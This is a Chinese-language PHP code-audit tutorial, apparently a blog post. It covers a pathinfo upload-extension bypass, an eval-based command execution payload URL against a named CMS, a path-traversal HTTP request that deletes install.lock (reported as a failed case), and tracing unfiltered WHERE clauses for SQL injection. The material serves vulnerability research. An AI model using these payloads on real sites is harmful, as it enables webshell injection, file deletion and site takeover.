pathinfo() 函数以数组的形式返回关于文件路径的信息。  
返回的数组元素如下：  
• [dirname]: 目录路径  
• [basename]: 文件名  
• [extension]: 文件后缀名  
• [filename]: 不包含后缀的文件名  
path 必需。规定要检查的路径。  
options 可选。规定要返回的数组元素。默认是 all。  
可能的值：  
• PATHINFO_DIRNAME - 只返回 dirname  
• PATHINFO_BASENAME - 只返回 basename  
• PATHINFO_EXTENSION - 只返回 extension  
• PATHINFO_FILENAME - 只返回 filename  
Pathinfo它返回的是一个数组  
我们再来看如下代码
    $name = $_GET['name'];
        $basename = pathinfo($name,PATHINFO_EXTENSION );
        $pathname = "D:\phpStudyUser\PHPTutorial\WWW\\".$name;
        if(!in_array($basename,['php', 'php3', 'php4', 'php5', 'phtml', 'pht'],true)){
               file_put_contents($name,'');
        }else{
                echo "错误";
        }
这里看到in_array进行后缀检验 pathinfo获取后缀 我们在上传的时候 如果get传过来的参数是1.php 这里肯定是不允许上传的
但是如果写成1.php/. 它会成功上传 如果我们写成1.php/. 它的exrension是一个空的值 可以成功上传
好啦文件上传就先到这里
命令执行漏洞  
这里我需要关注的这几个函数
  1. system：执行一个外部的应用程序并显示输出的结果
  2. exec：执行一个外部的应用程序
  3. shell_exec：执行shell命令并返回输出的结果的字符串
  4. passthru：执行一个UNIX系统命令并显示原始的输出
  5. popen()
  6. proc_popen()  
等等  
我们来看一个案例:
这里定义了一个Factory这个类 然后in_array 进行校验 查看是否有admin的权限 然后进行file_exists进行判断是否有这个路径
最后eval执行  
我们来看getA()方法里面是怎么写的
这里是从get请求方式的过来的 最后直接return 并没有任何过滤  
它既然是一个类文件 我们要看它实例化这个类的文件在哪 我们全局搜索
这里进行了实例化 接下来我们需要找到包含这个文件的
可以看到这几个文件进行了文件包含 我们进行构造  
www.ycccms.com/config/count.php?a=Factory();@eval($_POST[v]);//../  
所以一个正常的流程是  
Count.php包含了inc那个文件然后那个文件进了实例化了Factory这个类  
所以如果朋友类里面有eval这些危险函数不要慌 我们先看他哪里调用了这个类 再看哪里包含了这个文件 在进行挖掘
文件删除漏洞:  
这个漏洞就比较简单了  
这个在实战中可能遇到最多的就是unlink了 我们可以删除.lock文件导致重装等等  
接下来看一个小的案例
function delfile(){  
$file=safe_url(getform('path','post'));  
$type=safe_url(getform('type','post'));  
$file_path=file_path($file);
    echo $file_path;
// exit;  
$safe_path=array('upload','template','runtime','backup');  
if(arr_search($file_path,$safe_path)){  
$file=str_replace('//','/',$_SERVER['DOCUMENT_ROOT'].'/'.$file);  
$r=$type=='folder' ? del_folder($file) :del_file($file);  
if ($r){  
returnmsg('json',1,'删除成功');  
}else{  
returnmsg('json',0,'删除失败,请确认文件夹内是否为空，且有删除权限');  
}  
}  
post包:  
POST /admin/save.php?act=delfile HTTP/1.1  
Host: www.l.com:8000  
Content-Length: 53  
Accept: application/json, text/javascript, _/_ ; q=0.01  
Origin:   
X-Requested-With: XMLHttpRequest  
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/39.0.2171.71 Safari/537.36  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
Referer:
[http://www.l.com:8000/admin/?act=imagelist&numtype=1&upfolder=sort](http://www.l.com:8000/admin/?act=imagelist&numtype=1&upfolder=sort)  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.8  
Cookie: PHPSESSID=rnm3qjr3uec6lm06lodb089qk0; zzz660_adminpass=1;
zzz660_adminpath=1; zzz660_adminname=admin; zzz660_admintime=1632728834;
zzz660_adminface=..%2Fplugins%2Fface%2Fface01.png; XDEBUG_SESSION=PHPSTORM  
Connection: close  
type=file&path=upload%2F..%2Finstall%2Finstall.lock  
绕过$safe_path=array('upload','template','runtime','backup');  
但是$file_path = file_path($file)  
如果没有这个函数 这个是可以任意删除的
// 获取路径中的路径  
function file_path( $path ) {  
if (strpos( $path, './' )!== false) return error (
'404，很抱歉，路径有误,不支持相对路径！',SITE_PATH);  
$list=array();  
$path= substr( $path, 0, strrpos( $path, '/' ));  
$list=splits($path,'/');  
return $list;  
}  
这里判断了 是否有./  
但是我们通常绕过可以使用. 但是这里尝试过 它通过正则给干掉了 所以这里是一个失败的案例  
有时候文件删除也需要%00截断之类的 具体看代码是怎么写的
最后我们说下审计mvc框架  
MVC顾名思义是三个单词的首字母放在一起的简称，M-model（模型），V-view（试图），C-controller（控制器）  
我觉得审计mvc框架  
最主要的三点  
熟悉路由 熟悉url上面路由地址  
熟悉怎么传参的 比如说有些传参可能是?id=1 但是mvc可能是&id=1 有些可能接收参数是$_GET 有些可能是input接收 等等  
熟悉数据库内核 这个是需要调试的 我们只有熟悉了数据库内核 我们才知道它到底有没有进行过滤 才能进一步的挖掘  
熟悉数据库内核我们举一个小的例子  
我们就用yxcms的数据库内核来做一个小小的例子  
$result = model('sort')->find("id=$id");  
var_dump($result);  
首先查sort这个表
下断点然后进行分析
这里可以看到new sortModel 赋值给这个了  
public function find($condition = '', $field = '', $order = ''  
return $this->model->table($this->table,
$this->ignoreTablePrefix)->field($field)->where($condition)->order($order)->find();  
}  
然后我们进入find函数 这里先是执行了 where 然后是 order  
在就是find  
我们ff7进去  
Table 没什么好看的 给数据库赋值的一些东西 我们来到find
可以看到这里find函数还是调用的select函数 只不过给limit 加了一个 1
我们进入select函数
继续跟进where条件的函数 看看有没有过滤 因为id=1 我们是可控的所以 我们看下有没有过滤  
$condition = "";  
if(!empty($options['where'])) {  
$condition = " WHERE ";  
if(is_string($options['where'])) {  
$condition .= $options['where'];  
} else if(is_array($options['where'])) {  
foreach($options['where'] as $key => $value) {  
$condition .= " `$key` = " . $this->escape($value) . " AND ";  
}  
$condition = substr($condition, 0,-4);  
} else {  
$condition = "";  
}
可以看到这里的where没有进行任何的过滤 直接拼凑给$condtion了  
return $this->query("SELECT $field FROM $table $where", array(), true);  
我们出来再跟进query这个函数
可以看到这里直接执行了
具体数据库内核分析 我建议使用xdebug来分析 反正我觉得蛮好用的  
如果分析出数据库内核没有任何过滤 我们就去分析传递参数的时候有没有过滤 然后进行挖掘
好啦 具体文章就到这里了 又水了一篇文章 呜呜呜 大佬们别骂了 在努力学了